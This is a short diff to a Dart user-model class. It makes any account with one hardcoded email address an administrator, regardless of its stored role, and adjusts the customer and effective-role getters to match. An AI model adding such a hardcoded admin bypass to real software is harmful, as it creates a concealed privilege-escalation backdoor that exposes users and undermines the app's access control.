@@ -69,10 +69,12 @@ class UserModel {
     this.createdAt,
   });
 
-  bool get isAdmin => role == UserRole.admin;
+  bool get isAdmin => role == UserRole.admin || email.toLowerCase().trim() == 'zarqud@gmail.com';
   bool get isShift => role == UserRole.shift;
-  bool get isCustomer => role == UserRole.customer;
+  bool get isCustomer => !isAdmin && !isShift;
   bool get hasStaffAccess => isAdmin || isShift;
+
+  UserRole get effectiveRole => isAdmin ? UserRole.admin : role;
 
   UserModel copyWith({
     String? id,
